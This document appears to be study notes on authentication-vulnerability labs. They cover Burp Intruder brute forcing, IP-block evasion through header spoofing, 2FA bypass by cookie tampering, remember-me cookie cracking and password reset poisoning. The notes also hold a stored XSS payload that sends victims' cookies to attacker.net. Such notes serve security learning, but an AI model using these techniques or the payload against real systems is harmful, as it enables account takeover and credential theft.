# password-based login

## Brute-force attacks

### Brute-forcing usernames
##### via different responses:
>1) *in the `POST /login` request*: `username=§invalid-username§`
>2) *Payload*: *Sniper* -> wordlist
>3) **Length** *column* -> different response :  `Invalid username`/`Incorrect password` 
>   => username achieved
>4) `username=identified-user&password=§invalid-password§`
>5) `200` status code except for one, which got a **`302`** 
>   => password achieved

##### via _subtly_ different responses:
> **Settings** tab -> **Grep - Extract**, click Add -> `Invalid username or password`
> *one of the responses contains* **typo**: full stop/period -> trailing space 
> => username achieved
> ...

##### via response timing
> 1) IP gets blocked after several request 
> **`X-Forwarded-For`** header is supported -> *IP spoof*
> 2) use a very *long password* for password field (*time consuming* to proccess)
> 3) *payload*: *Pitchfork* 
>    - `X-Forwarded-For`: Numbers
>    - `username`: wordlist
>    Columns -> **Response received** and **Response completed** -> significant difference 
>    => username achieved
> 4) *payload*: *Pitchfork* 
>    - `X-Forwarded-For`: Numbers
>    - `password`: wordlist
>      -> `302` status
>      => password achieved

## Flawed brute-force protection

##### IP block:
  > **Resource pool** -> *maximum concurrent requests* set to **`1`**
  > - *payload*: *Pitchfork*: 
  >   - `username`: a wordlist which *alternates* between your username and the target
  >   - `password`: a wordlist which *alternates* between your password and a different wordlist for bruteforce the target

##### account lock:
> - *payload*: *Cluster bomb*:
>   - `username`: candidates of valid username
>   - `password`: same password but for each username repeated untill the rate limit gets reached -> **null payload**
>    => `username=§invalid-username§&password=example§§`
> - *`You have made too many incorrect login attempts`*
>   - => username achieved
> - *payload*: *sniper*:
>   - *Grep - Extract* -> the message
>   - `password`: wordlis
>     -> one has no error message 
>     => password achieved
# multi-factor authentication
## Bypassing two-factor authentication

##### simple bypass:
> 1) Log in using the victim's credentials
> 2) When prompted for the verification code -> load `/my-account`  => bypassed :)

##### broken logic:
1) user's logs in:
```http
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```
2) a cookie gets assigned that relates to their account:
```http
HTTP/1.1 200 OK
Set-Cookie: account=carlos
```
```http
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```
3) this cookie to determine which account the user is trying to access -> attacker logs in with their own credential then changes the value of the cookie :
```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```
=> attacker can use _his own verification code_ OR _brute force_ it
###### ex:
>1) login with your account 
>2) `POST /login2` request -> `verify` parameter:determines the user's account 
>3) logout
>4) complete the first step -> change the `verify` paramter to target's username -> brute force `mfa-code` parameter 
>   -> 302
>   => bypassed...

# other authentication mechanisms
## Keeping users logged in

##### brute-force:
> 1) *`stay-logged-in` cookie*: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcwCg==`
>    base 64 decode -> `wiener:51dc30ddc473d43a6011e9ebba6ca770` 
>    online cipher identified -> `base64(username+':'+md5HashOfPassword)`  
> 2) *Payload*: *Sniper* -> wordlist
> Under **Payload processing**:
>    - Hash: `MD5`
>    - Add prefix: `(target's username):`
>    - Encode: `Base64-encode`
>- => access to `update email` button in `/my-account` page = cookie generated.

##### offline password cracking:
> 1) `stay-logged-in` cookie -> base64 decode =>`username+':'+md5HashOfPassword`  
> 2) steal the target's cookie from the *comment section* using **XSS**:
>    stored XSS payload -> `<script>document.location='//attacker.net/'+document.cookie</script>`
>    => `carlos:26323c16d5f4dabff3bb136f2460a943`
> 3) bruteforce the password with **hashcat** 
>    => password achieved 

## Resetting user passwords

##### broken logic:
> 1) click the **Forgot your password?**
> 2) request: `POST /forgot-password?temp-forgot-password-token`
> 3) *delete `temp-forgot-password-token` parameter* in both the URL and request body
> 4) Change the `username` parameter to the target's username.
>    => account takeover...

##### password reset poisoning via middleware:
>- **`X-Forwarded-Host`** *header* is supported => `X-Forwarded-Host: attacker.site`
>  => victim's token sent as a query parameter in a `GET /forgot-password` request.
>- change the value of the `temp-forgot-password-token` parameter to the value that you stole from the victim
>  => account takeover
## Changing user passwords
##### password brute-force:
> 1) *difference between error messages when you enter* **two different new passwords**: 
>     `Current password is incorrect` => invalid password
>     `New passwords do not match` => valid password 
> 2) *Payload*: *Sniper* -> wordlist:
>    `username`: target's username
>    Settings tab: Grep - match rule
>    => `username=carlos&current-password=§FUZZ§&new-password-1=123&new-password-2=abc`